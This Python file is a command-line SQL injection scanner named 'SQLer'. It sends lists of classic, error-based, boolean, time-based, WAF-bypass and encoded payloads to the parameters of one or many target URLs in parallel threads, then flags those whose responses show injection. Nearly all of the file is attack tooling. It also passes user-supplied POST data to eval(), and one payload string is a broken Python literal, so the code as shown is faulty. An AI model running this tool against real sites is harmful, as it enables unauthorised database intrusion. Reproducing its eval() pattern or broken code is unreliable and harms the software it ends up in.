import argparse
import sys
import os
import time
import random
import string
import requests
import threading
from typing import List, Dict, Any, Optional

class SQLiPayloads:
    """
    Collection of advanced SQLi payloads and tampering techniques.
    """
    CLASSIC = [
        "'", '"', "'--", '"--', "')", '")', "' OR '1'='1", '" OR "1"="1',
        "' OR 1=1--", '" OR 1=1--', "' OR 'a'='a", '" OR "a"="a',
    ]
    ERROR_BASED = [
        "'", '"', "' OR 1=1--", '" OR 1=1--',
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a,(SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
    ]
    BOOLEAN_BASED = [
        "' AND 1=1--", "' AND 1=2--", '" AND 1=1--', '" AND 1=2--',
        "') AND 1=1--", '") AND 1=1--', "') AND 1=2--", '") AND 1=2--',
    ]
    TIME_BASED = [
        "' AND SLEEP(5)-- ", '" AND SLEEP(5)-- ',
        "' WAITFOR DELAY '0:0:5'--", '" WAITFOR DELAY '0:0:5'--',
    ]
    WAF_BYPASS = [
        "'/*!50000OR*/1=1--", "' OR 1=1#", "' OR 1=1/*", "' OR 1=1-- -", "' OR 1=1--+",
        "' OR 1=1;--", "' OR 1=1;%00", "' OR 1=1;%23", "' OR 1=1;%2D%2D",
    ]
    TAMPERED = [
        "%27%20OR%201%3D1--", "%27%20OR%20%271%27%3D%271--", "%22%20OR%20%221%22%3D%221--",
    ]
    ALL = CLASSIC + ERROR_BASED + BOOLEAN_BASED + TIME_BASED + WAF_BYPASS + TAMPERED

    @staticmethod
    def random_suffix(length=4):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

class SQLer:
    def __init__(self, urls: List[str], method: str = 'GET', data: Optional[str] = None, json_data: Optional[str] = None, threads: int = 5):
        self.urls = urls
        self.session = requests.Session()
        self.timeout = 10
        self.verbose = True
        self.method = method.upper()
        self.data = data
        self.json_data = json_data
        self.threads = threads

    def run(self):
        threads = []
        for url in self.urls:
            t = threading.Thread(target=self.scan_url, args=(url,))
            t.start()
            threads.append(t)
            if len(threads) >= self.threads:
                for th in threads:
                    th.join()
                threads = []
        for th in threads:
            th.join()

    def scan_url(self, url: str):
        print(f"[+] Scanning: {url}")
        result = self.detect_sqli(url)
        if result['vulnerable']:
            print(f"[!!!] SQLi Detected: {url}")
            print(f"[DETAILS] {result['details']}")
        else:
            print(f"[-] No SQLi detected: {url}")

    def detect_sqli(self, url: str) -> dict:
        details = []
        vulnerable = False
        baseline = self.get_baseline(url)
        for payload in SQLiPayloads.ALL:
            test_url, test_data, test_json = self.inject_payload(url, payload)
            try:
                start = time.time()
                resp = self.send_request(test_url, test_data, test_json)
                elapsed = time.time() - start
                analysis = self.analyze_response(resp, payload, elapsed, baseline)
                if self.verbose:
                    print(f"[PAYLOAD] {payload}")
                    print(f"[RESPONSE] Status: {resp.status_code}, Time: {elapsed:.2f}s, Length: {len(resp.text)}")
                if analysis['vulnerable']:
                    details.append(analysis['details'])
                    vulnerable = True
                    print(f"[!!!] Confirmed SQLi with payload: {payload}")
                    print(f"[DETAILS] {analysis['details']}")
            except Exception as e:
                if self.verbose:
                    print(f"[ERROR] {e}")
        return {'vulnerable': vulnerable, 'details': details if details else 'No SQLi detected'}

    def get_baseline(self, url: str):
        try:
            resp = self.send_request(url, self.data, self.json_data)
            return {'status': resp.status_code, 'length': len(resp.text), 'text': resp.text}
        except Exception:
            return {'status': None, 'length': 0, 'text': ''}

    def send_request(self, url, data, json_data):
        if self.method == 'POST':
            if json_data:
                return self.session.post(url, json=eval(json_data), timeout=self.timeout, allow_redirects=True)
            elif data:
                return self.session.post(url, data=eval(data), timeout=self.timeout, allow_redirects=True)
            else:
                return self.session.post(url, timeout=self.timeout, allow_redirects=True)
        else:
            return self.session.get(url, timeout=self.timeout, allow_redirects=True)

    def inject_payload(self, url: str, payload: str):
        # GET param injection
        test_url = url
        test_data = self.data
        test_json = self.json_data
        if self.method == 'GET' and '?' in url and '=' in url:
            base, params = url.split('?', 1)
            param_pairs = params.split('&')
            for i, pair in enumerate(param_pairs):
                if '=' in pair:
                    k, v = pair.split('=', 1)
                    param_pairs[i] = f"{k}={v}{payload}"
                    break
            test_url = base + '?' + '&'.join(param_pairs)
        elif self.method == 'POST':
            # POST data param injection
            if self.data:
                d = eval(self.data)
                for k in d:
                    d[k] = str(d[k]) + payload
                    break
                test_data = str(d)
            elif self.json_data:
                j = eval(self.json_data)
                for k in j:
                    j[k] = str(j[k]) + payload
                    break
                test_json = str(j)
        return test_url, test_data, test_json

    def analyze_response(self, resp: requests.Response, payload: str, elapsed: float, baseline: dict) -> Dict[str, Any]:
        error_signatures = [
            'You have an error in your SQL syntax',
            'Warning: mysql_',
            'Unclosed quotation mark',
            'quoted string not properly terminated',
            'SQLSTATE',
            'syntax error',
            'ORA-01756',
            'ODBC SQL Server Driver',
            'Microsoft OLE DB Provider for SQL Server',
            'PostgreSQL query failed',
            'supplied argument is not a valid MySQL',
        ]
        for sig in error_signatures:
            if sig.lower() in resp.text.lower():
                return {'vulnerable': True, 'details': f'Error-based SQLi detected with payload: {payload} | Signature: {sig}'}
        # Boolean-based: compare with baseline
        if payload in SQLiPayloads.BOOLEAN_BASED:
            if '1=1' in payload and resp.status_code == 200 and abs(len(resp.text) - baseline['length']) > 20:
                return {'vulnerable': True, 'details': f'Boolean-based SQLi detected with payload: {payload}'}
        # Time-based
        if payload in SQLiPayloads.TIME_BASED and elapsed > 4.5:
            return {'vulnerable': True, 'details': f'Time-based SQLi detected with payload: {payload} | Response time: {elapsed:.2f}s'}
        # WAF bypass/tampered
        if payload in SQLiPayloads.WAF_BYPASS + SQLiPayloads.TAMPERED:
            if any(sig.lower() in resp.text.lower() for sig in error_signatures):
                return {'vulnerable': True, 'details': f'WAF bypass SQLi detected with payload: {payload}'}
        return {'vulnerable': False, 'details': 'No SQLi detected'}

def parse_args():
    parser = argparse.ArgumentParser(description='SQLer: Advanced SQLi Detection Tool')
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-u', '--url', help='Target single URL')
    group.add_argument('-l', '--list', help='File with list of URLs (one per line)')
    parser.add_argument('-X', '--method', default='GET', help='HTTP method: GET or POST')
    parser.add_argument('--data', help='POST data as dict string, e.g. "{\'user\': \'admin\', \'pass\': \'123\'}"')
    parser.add_argument('--json', help='POST JSON as dict string, e.g. "{\'user\': \'admin\', \'pass\': \'123\'}"')
    parser.add_argument('--threads', type=int, default=5, help='Number of concurrent threads')
    return parser.parse_args()

def main():
    args = parse_args()
    urls = []
    if args.url:
        urls = [args.url]
    elif args.list:
        if not os.path.isfile(args.list):
            print(f"[ERROR] List file not found: {args.list}")
            sys.exit(1)
        with open(args.list, 'r') as f:
            urls = [line.strip() for line in f if line.strip()]
    if not urls:
        print("[ERROR] No URLs provided.")
        sys.exit(1)
    sqler = SQLer(urls, method=args.method, data=args.data, json_data=args.json, threads=args.threads)
    sqler.run()

if __name__ == '__main__':
    main()